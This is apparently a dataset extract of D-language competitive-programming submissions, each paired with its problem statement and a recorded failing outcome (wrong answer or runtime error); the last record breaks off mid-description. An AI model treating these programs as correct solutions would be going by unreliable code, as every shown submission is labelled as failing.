{"difficulty":2200,"lang":"D","lang_cluster":"d","src_uid":"1092_D1","submission_id":"47215554","tags":["greedy","implementation","math"],"exec_outcome":"WRONG_ANSWER","source_code":"import std.stdio, std.array, std.string, std.conv, std.algorithm;\r\nimport std.typecons, std.range, std.random, std.math, std.container;\r\nimport std.numeric, std.bigint, core.bitop, core.stdc.string;\r\n\r\nvoid main() {\r\n    auto N = readln.chomp.to!int;\r\n    auto A = readln.split.map!(x => x.to!long % 2).array;\r\n\r\n    auto cnt = A.count(1);\r\n\r\n    if (cnt % 2 == 1 && (N - cnt) % 2 == 1) {\r\n        writeln(\"NO\");\r\n        return;\r\n    }\r\n\r\n    if ((N-1).iota.map!(i => A[i] != A[i+1]).all) {\r\n        writeln(\"NO\");\r\n        return;\r\n    }\r\n\r\n    writeln(\"YES\");\r\n}\r\n","description":"Vova's family is building the Great Vova Wall (named by Vova himself). Vova's parents, grandparents, grand-grandparents contributed to it. Now it's totally up to Vova to put the finishing touches.The current state of the wall can be respresented by a sequence $$$a$$$ of $$$n$$$ integers, with $$$a_i$$$ being the height of the $$$i$$$-th part of the wall.Vova can only use $$$2 \\times 1$$$ bricks to put in the wall (he has infinite supply of them, however).Vova can put bricks horizontally on the neighboring parts of the wall of equal height. It means that if for some $$$i$$$ the current height of part $$$i$$$ is the same as for part $$$i + 1$$$, then Vova can put a brick there and thus increase both heights by 1. Obviously, Vova can't put bricks in such a way that its parts turn out to be off the borders (to the left of part $$$1$$$ of the wall or to the right of part $$$n$$$ of it).The next paragraph is specific to the version 1 of the problem.Vova can also put bricks vertically. That means increasing height of any part of the wall by 2.Vova is a perfectionist, so he considers the wall completed when:  all parts of the wall has the same height;  the wall has no empty spaces inside it. Can Vova complete the wall using any amount of bricks (possibly zero)?","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains a single integer $$$n$$$ ($$$1 \\\\le n \\\\le 2 \\\\cdot 10^5$$$) \u2014 the number of parts in the wall.\nThe second line contains $$$n$$$ integers $$$a_1, a_2, \\\\dots, a_n$$$ ($$$1 \\\\le a_i \\\\le 10^9$$$) \u2014 the initial heights of the parts of the wall.\n","output_spec":"Print \"YES\" if Vova can complete the wall using any amount of bricks (possibly zero).\nPrint \"NO\" otherwise.\n","notes":null,"sample_inputs":[],"sample_outputs":[]}
{"difficulty":1900,"lang":"D","lang_cluster":"d","src_uid":"1095_F","submission_id":"80626137","tags":["dsu","graphs","greedy"],"exec_outcome":"WRONG_ANSWER","source_code":"import std.stdio;\r\nimport std.container;\r\nimport std.random;\r\nimport std.range;\r\nimport std.algorithm;\r\nimport std.typecons;\r\nimport std.conv;\r\nimport std.format;\r\n\r\nint[] par;\r\nlong[] smallest;\r\n\r\nint find_set(int v) {\r\n\tif (v == par[v]) return v;\r\n\treturn par[v] = find_set(par[v]);\r\n}\r\n\r\nMt19937 rng;\r\n\r\nvoid unite(int a, int b) {\r\n\ta = find_set(a);\r\n\tb = find_set(b);\r\n\tif (rng.front % 2) swap(a, b);\r\n\trng.popFront();\r\n\tpar[b] = a;\r\n\tsmallest[a] = min(smallest[a], smallest[b]);\r\n}\r\n\r\nvoid main() \r\n{\r\n\tpar = iota(200000).array;\r\n\r\n\tint n, m;\r\n\tstdin.byLine.front.formattedRead!\"%d %d\"(n, m);\r\n\r\n\tauto S = redBlackTree!(Tuple!(long, int));\r\n\tauto offers = redBlackTree!(Tuple!(long, int, int));\r\n\r\n\tsmallest = stdin.byLine.front.split(\" \").map!`parse!long(a)`.array;\r\n\r\n\tsmallest.writeln;\r\n\r\n\tforeach (i, e; smallest) {\r\n\t\tS.insert(tuple(e, i.to!int));\r\n\t}\r\n\r\n\tfor (int i = 0; i < m; i++) {\r\n\t\tint a, b;\r\n\t\tlong w;\r\n\t\tstdin.byLine.front.formattedRead!\"%d %d %d\"(a, b, w);\r\n\r\n\t\ta--; b--;\r\n\t\toffers.insert(tuple(w, a, b));\r\n\t}\r\n\r\n\tlong totalCost = 0;\r\n\twhile (true) {\r\n\t\tif (S.length == 1) {\r\n\t\t\twriteln(totalCost);\r\n\t\t\treturn;\r\n\t\t}\r\n\r\n\t\twhile (offers.length > 0 && find_set(offers.front[1]) == find_set(offers.front[2]))\r\n\t\t\toffers.removeFront();\r\n\r\n\t\tauto c1 = S.front; S.removeFront();\r\n\t\tauto c2 = S.front; S.removeFront();\r\n\t\tauto cost = c1[0] + c2[0];\r\n\r\n\t\tif (offers.length > 0 && offers.front[0] < cost) {\r\n\t\t\tS.insert([c1, c2]);\r\n\t\t\ttotalCost += offers.front[0];\r\n\t\t\tint x = offers.front[1];\r\n\t\t\tint y = offers.front[2];\r\n\r\n\t\t\tint setx = find_set(x);\r\n\t\t\tint sety = find_set(y);\r\n\r\n\t\t\tS.removeKey(tuple(smallest[setx], setx));\r\n\t\t\tS.removeKey(tuple(smallest[sety], sety));\r\n\t\t\tunite(x, y);\r\n\t\t\tint setxy = find_set(x);\r\n\t\t\tS.insert(tuple(smallest[setxy], setxy));\r\n\t\t} else {\r\n\t\t\ttotalCost += cost;\r\n\t\t\tint x = c1[1];\r\n\t\t\tint y = c2[1];\r\n\t\t\tunite(x, y);\r\n\r\n\t\t\tint setxy = find_set(x);\r\n\t\t\tS.insert(tuple(smallest[setxy], setxy));\r\n\t\t}\r\n\t}\r\n}","description":"You are given an undirected graph consisting of $$$n$$$ vertices. A number is written on each vertex; the number on vertex $$$i$$$ is $$$a_i$$$. Initially there are no edges in the graph.You may add some edges to this graph, but you have to pay for them. The cost of adding an edge between vertices $$$x$$$ and $$$y$$$ is $$$a_x + a_y$$$ coins. There are also $$$m$$$ special offers, each of them is denoted by three numbers $$$x$$$, $$$y$$$ and $$$w$$$, and means that you can add an edge connecting vertices $$$x$$$ and $$$y$$$ and pay $$$w$$$ coins for it. You don't have to use special offers: if there is a pair of vertices $$$x$$$ and $$$y$$$ that has a special offer associated with it, you still may connect these two vertices paying $$$a_x + a_y$$$ coins for it.What is the minimum number of coins you have to spend to make the graph connected? Recall that a graph is connected if it's possible to get from any vertex to any other vertex using only the edges belonging to this graph.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains two integers $$$n$$$ and $$$m$$$ ($$$1 \\\\le n \\\\le 2 \\\\cdot 10^5$$$, $$$0 \\\\le m \\\\le 2 \\\\cdot 10^5$$$) \u2014 the number of vertices in the graph and the number of special offers, respectively.\nThe second line contains $$$n$$$ integers $$$a_1, a_2, \\\\dots, a_n$$$ ($$$1 \\\\le a_i \\\\le 10^{12}$$$) \u2014 the numbers written on the vertices.\nThen $$$m$$$ lines follow, each containing three integers $$$x$$$, $$$y$$$ and $$$w$$$ ($$$1 \\\\le x, y \\\\le n$$$, $$$1 \\\\le w \\\\le 10^{12}$$$, $$$x \\\\ne y$$$) denoting a special offer: you may add an edge connecting vertex $$$x$$$ and vertex $$$y$$$, and this edge will cost $$$w$$$ coins.\n","output_spec":"Print one integer \u2014 the minimum number of coins you have to pay to make the graph connected.\n","notes":null,"sample_inputs":[],"sample_outputs":[]}
{"difficulty":1900,"lang":"D","lang_cluster":"d","src_uid":"1163_C1","submission_id":"53950822","tags":["brute+force","geometry"],"exec_outcome":"WRONG_ANSWER","source_code":"void main() {\r\nimport std.stdio;\r\nwriteln(long.sizeof);\r\n}","description":"This problem is same as the next one, but has smaller constraints.It was a Sunday morning when the three friends Selena, Shiro and Katie decided to have a trip to the nearby power station (do not try this at home). After arriving at the power station, the cats got impressed with a large power transmission system consisting of many chimneys, electric poles, and wires. Since they are cats, they found those things gigantic.At the entrance of the station, there is a map describing the complicated wiring system. Selena is the best at math among three friends. He decided to draw the map on the Cartesian plane. Each pole is now a point at some coordinates $$$(x_i, y_i)$$$. Since every pole is different, all of the points representing these poles are distinct. Also, every two poles are connected with each other by wires. A wire is a straight line on the plane infinite in both directions. If there are more than two poles lying on the same line, they are connected by a single common wire.Selena thinks, that whenever two different electric wires intersect, they may interfere with each other and cause damage. So he wonders, how many pairs are intersecting? Could you help him with this problem?","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains a single integer $$$n$$$ ($$$2 \\\\le n \\\\le 50$$$)\u00a0\u2014 the number of electric poles.\nEach of the following $$$n$$$ lines contains two integers $$$x_i$$$, $$$y_i$$$ ($$$-10^4 \\\\le x_i, y_i \\\\le 10^4$$$)\u00a0\u2014 the coordinates of the poles.\nIt is guaranteed that all of these $$$n$$$ points are distinct.\n","output_spec":"Print a single integer\u00a0\u2014 the number of pairs of wires that are intersecting.\n","notes":null,"sample_inputs":[],"sample_outputs":[]}
{"difficulty":1600,"lang":"D","lang_cluster":"d","src_uid":"131_D","submission_id":"27719841","tags":["dfs+and+similar","graphs"],"exec_outcome":"WRONG_ANSWER","source_code":"import std.stdio;\r\nimport std.typecons;\r\nimport std.range;\r\nimport std.algorithm;\r\nimport std.array;\r\nimport std.conv;\r\n\r\nstruct Queue(T) {\r\n  private T[] items = [T.init];\r\n  private size_t first, last;\r\n\r\n  @property bool empty() { \r\n    return first == last; \r\n  }\r\n\r\n  void push(T top) { \r\n    if (last == items.length) {\r\n      items.length = max(1, items.length*2);\r\n    }\r\n    items[last] = top;\r\n    last++;\r\n  }\r\n\r\n  T pop() {\r\n    if (this.empty)\r\n      throw new Exception(\"Empty Queue.\");\r\n    auto top = items[first];\r\n    first++;\r\n    return top;\r\n  }\r\n}\r\n\r\nvoid main() {\r\n  int n;\r\n  readf(\" %d\", &n);\r\n  auto g = new int[][](n+1, 0);\r\n  auto parent = new int[](n+1);\r\n  auto visited = new int[](n+1);\r\n  auto cycle = new int[](n+1);\r\n  auto distances = new int[](n+1);\r\n  int a,b;\r\n  while (readf(\" %d %d\", &a, &b)) {\r\n    g[a] ~= b;\r\n    g[b] ~= a;\r\n  }\r\n  bool cycle_found = false;\r\n  void dfs(int u, int p) {\r\n    visited[u] = 1;\r\n    parent[u] = p;\r\n    if(cycle_found) return;\r\n    foreach (v; g[u]) {\r\n      if (v == p || visited[v] == 2 || cycle_found) continue;\r\n      if (visited[v] == 1) {\r\n        cycle[v] = 1;\r\n        int x = u;\r\n        while (x != v) {\r\n          cycle[x] = 1;\r\n          x = parent[x];\r\n        }\r\n        cycle_found = true;\r\n        return;\r\n      }\r\n      dfs(v, u);\r\n    }\r\n    visited[u] = 2;\r\n  }\r\n  \r\n  \r\n  void bfs(int u0) {\r\n    Queue!int q;\r\n    q.push(u0);\r\n    while (!q.empty) {\r\n      auto u = q.pop();\r\n      visited[u] = 1;\r\n      foreach (v; g[u]) {\r\n        if (visited[v]) continue;\r\n        if (!cycle[v]) {\r\n          distances[v] = distances[u] + 1;\r\n        }\r\n        q.push(v);\r\n      }\r\n    }\r\n  }\r\n  dfs(1, 0);\r\n  visited[] = 0;\r\n  bfs(to!int(cycle.countUntil(1) + 1));\r\n  debug {\r\n    writeln(cycle);\r\n  }\r\n  writefln(\"%(%s %)\", distances[1..$]);\r\n}\r\n","description":"A subway scheme, classic for all Berland cities is represented by a set of n stations connected by n passages, each of which connects exactly two stations and does not pass through any others. Besides, in the classic scheme one can get from any station to any other one along the passages. The passages can be used to move in both directions. Between each pair of stations there is no more than one passage.Berland mathematicians have recently proved a theorem that states that any classic scheme has a ringroad. There can be only one ringroad. In other words, in any classic scheme one can find the only scheme consisting of stations (where any two neighbouring ones are linked by a passage) and this cycle doesn't contain any station more than once.This invention had a powerful social impact as now the stations could be compared according to their distance from the ringroad. For example, a citizen could say \"I live in three passages from the ringroad\" and another one could reply \"you loser, I live in one passage from the ringroad\". The Internet soon got filled with applications that promised to count the distance from the station to the ringroad (send a text message to a short number...).The Berland government decided to put an end to these disturbances and start to control the situation. You are requested to write a program that can determine the remoteness from the ringroad for each station by the city subway scheme.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains an integer n (3\u2264n\u22643000), n is the number of stations (and trains at the same time) in the subway scheme. Then n lines contain descriptions of the trains, one per line. Each line contains a pair of integers xi,yi (1\u2264xi,yi\u2264n) and represents the presence of a passage from station xi to station yi. The stations are numbered from 1 to n in an arbitrary order. It is guaranteed that xi\u2260yi and that no pair of stations contain more than one passage. The passages can be used to travel both ways. It is guaranteed that the given description represents a classic subway scheme.\n","output_spec":"Print n numbers. Separate the numbers by spaces, the i-th one should be equal to the distance of the i-th station from the ringroad. For the ringroad stations print number 0.\n","notes":null,"sample_inputs":["4\n1 3\n4 3\n4 2\n1 2\n","6\n1 2\n3 4\n6 4\n2 3\n1 3\n3 5\n"],"sample_outputs":["0 0 0 0 ","0 0 0 1 1 2 "]}
{"difficulty":1900,"lang":"D","lang_cluster":"d","src_uid":"137_D","submission_id":"9194368","tags":["dp","strings"],"exec_outcome":"WRONG_ANSWER","source_code":"import std.stdio;\r\nimport std.ascii;\r\nimport std.range;\r\nimport std.array;\r\nimport std.functional;\r\nimport std.algorithm;\r\nimport std.conv;\r\nimport std.container;\r\nimport std.math;\r\nimport std.numeric;\r\nimport std.string;\r\nimport std.c.string;\r\nimport std.random;\r\nimport std.regex;\r\nimport std.typecons;\r\n\r\nstring s; int K;\r\n\r\nstruct R {\r\n    int from, to;\r\n    int diff;\r\n}\r\n\r\nstring modify(in string s) {\r\n    int N = cast(int)(s.length);\r\n    auto t = s[0 .. N \/ 2].dup;\r\n    t.reverse;\r\n    if (N & 1) {\r\n        return s[0 .. N \/ 2] ~ s[N \/ 2] ~ t.idup;\r\n    } else {\r\n        return s[0 .. N \/ 2] ~ t.idup;\r\n    }\r\n}\r\n\r\nvoid main() {\r\n    s = readln.chomp;\r\n    scanf(\"%d\\n\", &K);\r\n    int N = cast(int)s.length;\r\n\r\n    R[] rs;\r\n    foreach (int i; 0 .. N) {\r\n        foreach (int j; i + 1 .. N + 1) {\r\n            int count(in string s) {\r\n                int n = cast(int)s.length;\r\n                int ret = 0;\r\n                foreach (int i, c; s) {\r\n                    if (c != s[n - 1 - i]) ret++;\r\n                }\r\n                return ret \/ 2;\r\n            }\r\n            rs ~= R(i, j, count(s[i .. j]));\r\n        }\r\n    }\r\n\r\n    rs.sort!\"a.from < b.from\";\r\n    const INF = 1<<28;\r\n    auto dp = new int[][](K + 1, N + 1);\r\n    auto prev = new int[][](K + 1, N + 1);\r\n    foreach (k; 0 .. K + 1) dp[k][] = INF;\r\n    for (int i = 0; i < N && rs[i].from == 0; i++) {\r\n        dp[1][rs[i].to] = rs[i].diff;\r\n        prev[1][rs[i].to] = rs[i].from;\r\n    }\r\n    foreach (k; 1 .. K) {\r\n        foreach (n; 0 .. N) dp[k + 1][n] = min(dp[k + 1][n], dp[k][n]);\r\n        foreach (r; rs) {\r\n            if (dp[k + 1][r.to] > dp[k][r.from] + r.diff) {\r\n                dp[k + 1][r.to] = dp[k][r.from] + r.diff;\r\n                prev[k + 1][r.to] = r.from;\r\n            }\r\n        }\r\n    }\r\n    int ansCount = INF;\r\n    int ansK = 0;\r\n    foreach (int k; 0 .. K + 1) {\r\n        if (ansCount > dp[k][N]) {\r\n            ansCount = dp[k][N];\r\n            ansK = k;\r\n        }\r\n    }\r\n    writeln(ansCount);\r\n    int n = N;\r\n    int p = prev[ansK][N];\r\n    string[] ans;\r\n    int k = ansK;\r\n    while (k > 0) {\r\n        ans ~= s[p .. n];\r\n        n = p;\r\n        p = prev[--k][n];\r\n    }\r\n    writeln(ans.map!(modify).join(\"+\"));\r\n    \/\/foreach (l; dp[1 .. $]) l.writeln;\r\n}\r\n","description":"Friday is Polycarpus' favourite day of the week. Not because it is followed by the weekend, but because the lessons on Friday are 2 IT lessons, 2 math lessons and 2 literature lessons. Of course, Polycarpus has prepared to all of them, unlike his buddy Innocentius. Innocentius spent all evening playing his favourite game Fur2 and didn't have enough time to do the literature task. As Innocentius didn't want to get an F, he decided to do the task and read the book called \"Storm and Calm\" during the IT and Math lessons (he never used to have problems with these subjects). When the IT teacher Mr. Watkins saw this, he decided to give Innocentius another task so that the boy concentrated more on the lesson and less \u2014 on the staff that has nothing to do with IT. Mr. Watkins said that a palindrome is a string that can be read the same way in either direction, from the left to the right and from the right to the left. A concatenation of strings a, b is a string ab that results from consecutive adding of string b to string a. Of course, Innocentius knew it all but the task was much harder than he could have imagined. Mr. Watkins asked change in the \"Storm and Calm\" the minimum number of characters so that the text of the book would also be a concatenation of no more than k palindromes. Innocentius can't complete the task and therefore asks you to help him.","input_from":"standard input","output_to":"standard output","input_spec":"The first input line contains a non-empty string s which is the text of \"Storm and Calm\" (without spaces). The length of the string s does not exceed 500 characters. String s consists of uppercase and lowercase Latin letters. The second line contains a single number k (1\u2264k\u2264|s|, where |s| represents the length of the string s).\n","output_spec":"Print on the first line the minimum number of changes that Innocentius will have to make. Print on the second line the string consisting of no more than k palindromes. Each palindrome should be non-empty and consist of uppercase and lowercase Latin letters. Use the character \"+\" (ASCII-code 43) to separate consecutive palindromes. If there exist several solutions, print any of them.\nThe letters' case does matter, that is an uppercase letter is not considered equivalent to the corresponding lowercase letter.\n","notes":null,"sample_inputs":["abacaba\n1\n","abdcaba\n2\n","abdcaba\n5\n","abacababababbcbabcd\n3\n"],"sample_outputs":["0\nabacaba\n","1\nabdcdba\n","0\na+b+d+c+aba\n","1\nabacaba+babab+bcbabcb\n"]}
{"difficulty":1900,"lang":"D","lang_cluster":"d","src_uid":"138_B","submission_id":"191399233","tags":["greedy"],"exec_outcome":"WRONG_ANSWER","source_code":"import std.stdio;\r\nimport std.string;\r\nimport std.algorithm;\r\n\r\nvoid main() {\r\n  char[] n = readln.chomp.dup;\r\n  uint[10] map1, map2;\r\n  string perm1 = \"\";\r\n  string perm2 = \"\";\r\n\r\n  foreach (digit; n) {\r\n    map1[digit - '0']++;\r\n    map2[digit - '0']++;\r\n  }\r\n\r\n  bool proceed = false;\r\n  uint zeros = 0;\r\n  uint zeroPairs = 0;\r\n\r\n  \/\/ check optimal last zero\r\n  for (int i = 1; i <= 9 && !proceed; i++) {\r\n    if (map1[i] != 0 && map2[10 - i] != 0 && map2[9 - i] == 0) {\r\n      proceed = true;\r\n      zeros++;\r\n      map1[i]--;\r\n      map2[10 - i]--;\r\n      perm1 ~= i + '0';\r\n      perm2 ~= 10 - i + '0';\r\n    }\r\n  }\r\n\r\n  \/\/ check non-optimal last zero\r\n  for (int i = 1; i <= 9 && !proceed; i++) {\r\n    if (map1[i] != 0 && map2[10 - i] != 0) {\r\n      proceed = true;\r\n      zeros++;\r\n      map1[i]--;\r\n      map2[10 - i]--;\r\n      perm1 ~= i + '0';\r\n      perm2 ~= 10 - i + '0';\r\n    }\r\n  }\r\n\r\n  while (proceed) {\r\n    proceed = false;\r\n    for (int i = 0; i <= 9 && !proceed; i++) {\r\n      if (map1[i] != 0 && map2[9 - i] != 0) {\r\n        proceed = true;\r\n        zeros++;\r\n        map1[i]--;\r\n        map2[9 - i]--;\r\n      perm1 ~= i + '0';\r\n      perm2 ~= 9 - i + '0';\r\n      }\r\n    }\r\n    if (!proceed && map1[0] != 0 && map2[0] != 0) {\r\n      proceed = true;\r\n      zeros++;\r\n      map1[0]--;\r\n      map2[0]--;\r\n      zeroPairs++;\r\n    }\r\n  }\r\n\r\n  for (int i = 0; i <= 9 && !proceed; i++) {\r\n    while (map1[i] != 0) {\r\n      perm1 ~= i + '0';\r\n      map1[i]--;\r\n    }\r\n    while (map2[i] != 0) {\r\n      perm2 ~= i + '0';\r\n      map2[i]--;\r\n    }\r\n  }\r\n\r\n  perm1 = perm1.dup.reverse;\r\n  perm2 = perm2.dup.reverse;\r\n\r\n  for (int i = 0; i < zeroPairs; i++) {\r\n    perm1 ~= '0';\r\n    perm2 ~= '0';\r\n  }\r\n\r\n  writeln(perm1);\r\n  writeln(perm2);\r\n}\r\n","description":"Andrey's favourite number is n. Andrey's friends gave him two identical numbers n as a New Year present. He hung them on a wall and watched them adoringly.Then Andrey got bored from looking at the same number and he started to swap digits first in one, then in the other number, then again in the first number and so on (arbitrary number of changes could be made in each number). At some point it turned out that if we sum the resulting numbers, then the number of zeroes with which the sum will end would be maximum among the possible variants of digit permutations in those numbers.Given number n, can you find the two digit permutations that have this property?","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains a positive integer n \u2014 the original number. The number of digits in this number does not exceed 10^5. The number is written without any leading zeroes.\n","output_spec":"Print two permutations of digits of number n, such that the sum of these numbers ends with the maximum number of zeroes. The permutations can have leading zeroes (if they are present, they all should be printed). The permutations do not have to be different. If there are several answers, print any of them.\n","notes":null,"sample_inputs":["198\n","500\n"],"sample_outputs":["981\n819\n","500\n500\n"]}
{"difficulty":1700,"lang":"D","lang_cluster":"d","src_uid":"1400_B","submission_id":"178036080","tags":["brute+force","greedy","math"],"exec_outcome":"WRONG_ANSWER","source_code":"import std.stdio;\r\nimport std.math;\r\nimport std.numeric;\r\nimport std.container;\r\nimport std.typecons;\r\nimport std.conv;\r\nimport std.array;\r\nimport std.string;\r\nimport std.range;\r\nimport std.algorithm;\r\nimport core.bitop;\r\nimport core.stdc.stdio : scanf;\r\n\r\nT read(T)() { return readln.chomp.to!T; }\r\nT[] readarray(T)() { return readln.chomp.split(\" \").map!(to!T).array; }\r\nvoid chmin(T)(ref T a, in T b) { a = min(a, b); }\r\nvoid chmax(T)(ref T a, in T b) { a = max(a, b); }\r\n\r\nvoid main() {\r\n    int T = read!int;\r\n    foreach (t; 0 .. T) solve();\r\n}\r\n\r\nvoid solve() {\r\n    long P, F; readf(\"%d %d\\n\", &P, &F);\r\n    int Cs, Cw; readf(\"%d %d\\n\", &Cs, &Cw);\r\n    long S, W; readf(\"%d %d\\n\", &S, &W);\r\n\r\n    long ans = 0;\r\n    for (int np = 0; np <= Cs; np++) {\r\n        long r = P - np * S;\r\n        if (r < 0) break;\r\n        long mp = min(r \/ W, Cw);\r\n        long Rs = Cs - np;\r\n        long Rw = Cw - mp;\r\n        if (S < W) {\r\n            long nf, mf;\r\n            if (F \/ S <= Rs) {\r\n                nf = F \/ S;\r\n                mf = 0;\r\n            } else {\r\n                nf = Rs;\r\n                mf = min((F - nf * S) \/ W, Rw);\r\n            }\r\n            ans.chmax(np + mp + nf + mf);\r\n        } else {\r\n            long nf, mf;\r\n            if (F \/ W <= Rw) {\r\n                mf = F \/ W;\r\n                nf = 0;\r\n            } else {\r\n                mf = Rw;\r\n                nf = min((F - mf * W) \/ W, Rs);\r\n            }\r\n            ans.chmax(np + mp + nf + mf);\r\n        }\r\n    }\r\n    writeln(ans);\r\n}\r\n","description":"You are playing one RPG from the 2010s. You are planning to raise your smithing skill, so you need as many resources as possible. So how to get resources? By stealing, of course.You decided to rob a town's blacksmith and you take a follower with you. You can carry at most $$$p$$$ units and your follower\u00a0\u2014 at most $$$f$$$ units.In the blacksmith shop, you found $$$cnt_s$$$ swords and $$$cnt_w$$$ war axes. Each sword weights $$$s$$$ units and each war axe\u00a0\u2014 $$$w$$$ units. You don't care what to take, since each of them will melt into one steel ingot.What is the maximum number of weapons (both swords and war axes) you and your follower can carry out from the shop?","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains a single integer $$$t$$$ ($$$1 \\\\le t \\\\le 10^4$$$)\u00a0\u2014 the number of test cases.\nThe first line of each test case contains two integers $$$p$$$ and $$$f$$$ ($$$1 \\\\le p, f \\\\le 10^9$$$)\u00a0\u2014 yours and your follower's capacities.\nThe second line of each test case contains two integers $$$cnt_s$$$ and $$$cnt_w$$$ ($$$1 \\\\le cnt_s, cnt_w \\\\le 2 \\\\cdot 10^5$$$)\u00a0\u2014 the number of swords and war axes in the shop.\nThe third line of each test case contains two integers $$$s$$$ and $$$w$$$ ($$$1 \\\\le s, w \\\\le 10^9$$$)\u00a0\u2014 the weights of each sword and each war axe.\nIt's guaranteed that the total number of swords and the total number of war axes in all test cases don't exceed $$$2 \\\\cdot 10^5$$$.\n","output_spec":"For each test case, print the maximum number of weapons (both swords and war axes) you and your follower can carry.\n","notes":null,"sample_inputs":[],"sample_outputs":[]}
{"difficulty":1800,"lang":"D","lang_cluster":"d","src_uid":"174_C","submission_id":"56367294","tags":["data+structures","greedy"],"exec_outcome":"WRONG_ANSWER","source_code":"import core.bitop, std.bitmanip;\r\nimport core.checkedint;\r\nimport std.algorithm, std.functional;\r\nimport std.array, std.container;\r\nimport std.bigint;\r\nimport std.conv;\r\nimport std.datetime.stopwatch;\r\nimport std.math, std.numeric;\r\nimport std.range, std.range.interfaces;\r\nimport std.stdio, std.string;\r\nimport std.typecons;\r\n\r\nvoid main()\r\n{\r\n    int n;\r\n    readf(\"%s\", &n);\r\n    readln;\r\n\r\n    auto arr = [0] ~ readln.chomp.split.map!(to!int).array ~ [0];\r\n    \r\n    debug { arr.writeln; }\r\n    \r\n    Tuple!(int, int)[] ans;\r\n    \r\n    auto stk = make!(SList!int);\r\n    stk.insertFront(0);\r\n    foreach (i; 1 .. n+1) {\r\n        if (arr[i] > arr[i-1]) { stk.insertFront(i); }\r\n        \r\n        if (arr[i] > arr[i+1]) {\r\n            while (arr[stk.front] > arr[i+1]) {\r\n                auto lft = stk.front;\r\n                stk.removeFront();\r\n                \r\n                auto ht = arr[lft];\r\n                \r\n                foreach (_; 0 .. ht - arr[stk.front]) {\r\n                    ans ~= tuple(lft, i);\r\n                }\r\n            }\r\n        }\r\n    }\r\n    \r\n    ans.length.writeln;\r\n    ans.each!(t => writeln(t[0], ' ', t[1]));\r\n}","description":"Polycarpus is an amateur programmer. Now he is analyzing a friend's program. He has already found there the function rangeIncrement(l, r), that adds 1 to each element of some array a for all indexes in the segment [l,r]. In other words, this function does the following: function rangeIncrement(l, r)    for i := l .. r do        a[i] = a[i] + 1Polycarpus knows the state of the array a after a series of function calls. He wants to determine the minimum number of function calls that lead to such state. In addition, he wants to find what function calls are needed in this case. It is guaranteed that the required number of calls does not exceed 10^5.Before calls of function rangeIncrement(l, r) all array elements equal zero.","input_from":"standard input","output_to":"standard output","input_spec":"The first input line contains a single integer n (1\u2264n\u226410^5) \u2014 the length of the array a[1... n]. \nThe second line contains its integer space-separated elements, a[1],a[2],...,a[n] (0\u2264a[i]\u226410^5) after some series of function calls rangeIncrement(l, r). \nIt is guaranteed that at least one element of the array is positive. It is guaranteed that the answer contains no more than 10^5 calls of function rangeIncrement(l, r).\n","output_spec":"Print on the first line t \u2014 the minimum number of calls of function rangeIncrement(l, r), that lead to the array from the input data. It is guaranteed that this number will turn out not more than 10^5.\nThen print t lines \u2014 the descriptions of function calls, one per line. Each line should contain two integers li,ri (1\u2264li\u2264ri\u2264n) \u2014 the arguments of the i-th call rangeIncrement(l, r). Calls can be applied in any order.\nIf there are multiple solutions, you are allowed to print any of them.\n","notes":"The first sample requires a call for the entire array, and four additional calls:\n  one for the segment [2,2] (i.e. the second element of the array),  three for the segment [5,5] (i.e. the fifth element of the array). ","sample_inputs":["6\n1 2 1 1 4 1\n","5\n1 0 1 0 1\n"],"sample_outputs":["5\n2 2\n5 5\n5 5\n5 5\n1 6\n","3\n1 1\n3 3\n5 5\n"]}
{"difficulty":1800,"lang":"D","lang_cluster":"d","src_uid":"182_E","submission_id":"55976519","tags":["dp"],"exec_outcome":"RUNTIME_ERROR","source_code":"import core.bitop, std.bitmanip;\r\nimport core.checkedint;\r\nimport std.algorithm, std.functional;\r\nimport std.array, std.container;\r\nimport std.bigint;\r\nimport std.conv;\r\nimport std.datetime.stopwatch;\r\nimport std.math, std.numeric;\r\nimport std.range, std.range.interfaces;\r\nimport std.stdio, std.string;\r\nimport std.typecons;\r\n\r\nimmutable int MD = 10 ^^ 9 + 7;\r\n\r\nvoid main()\r\n{\r\n    int n, len;\r\n    readf(\"%s %s\", &n, &len);\r\n    readln;\r\n\r\n    int[][] arr;\r\n    foreach (i; 0 .. n) {\r\n        int x, y;\r\n        readf(\"%s %s\", &x, &y);\r\n        readln;\r\n        \r\n        arr ~= [x, y];\r\n    }\r\n    \r\n    debug { arr.writeln; }\r\n    \r\n    auto dp = new int[][][] (len+1, n, 2);\r\n    foreach (i, e; arr) {\r\n        dp[e[0]][i][0] = 1;\r\n        if (e[0] != e[1]) { dp[e[1]][i][1] = 1; }\r\n    }\r\n    \r\n    debug { dp.writeln; }\r\n    \r\n    foreach (clen; 2 .. len+1) {\r\n        foreach (i, e; arr) {\r\n            foreach (turn; 0 .. 2) {\r\n                if (turn == 1 && e[0] == e[1]) { continue; }\r\n                \r\n                int elen = e[turn];\r\n                if (elen >= clen) { continue; }\r\n                \r\n                foreach (j, p; arr) {\r\n                    if (i == j) { continue; }\r\n                    \r\n                    foreach (pTurn; 0 .. 2) {\r\n                        if (pTurn == 1 && p[0] == p[1]) { continue; }\r\n                        \r\n                        int pMatch = p[1 - pTurn];\r\n                        if (elen != pMatch) { continue; }\r\n                        \r\n                        debug { if (clen == 3 && i == 1) { writeln(turn, ' ', j, ' ', pTurn, ' ', pMatch, ' ', dp[clen-elen][j][pTurn]); } }\r\n                        dp[clen][i][turn] = (dp[clen][i][turn] + dp[clen-elen][j][pTurn]) % MD;\r\n                    }\r\n                }\r\n            }\r\n        }\r\n    }\r\n    \r\n    debug { dp.each!writeln; }\r\n    \r\n    int ans = 0;\r\n    foreach (ref e; dp[len]) {\r\n        foreach (et; e) { ans = (ans + et) % MD; }\r\n    }\r\n    \r\n    ans.writeln;\r\n}","description":"Vasya has recently bought some land and decided to surround it with a wooden fence.He went to a company called \"Wooden board\" that produces wooden boards for fences. Vasya read in the catalog of products that the company has at its disposal n different types of wood. The company uses the i-th type of wood to produce a board of this type that is a rectangular ai by bi block.Vasya decided to order boards in this company and build a fence from them. It turned out that the storehouse of the company is so large that Vasya can order arbitrary number of boards of every type. Note that Vasya is allowed to turn the boards as he builds the fence. However, Vasya cannot turn square boards.Vasya is required to construct a fence of length l, however, an arbitrary fence won't do. Vasya wants his fence to look beautiful. We'll say that a fence is beautiful if and only if the following two conditions are fulfilled:  there are no two successive boards of the same type  the 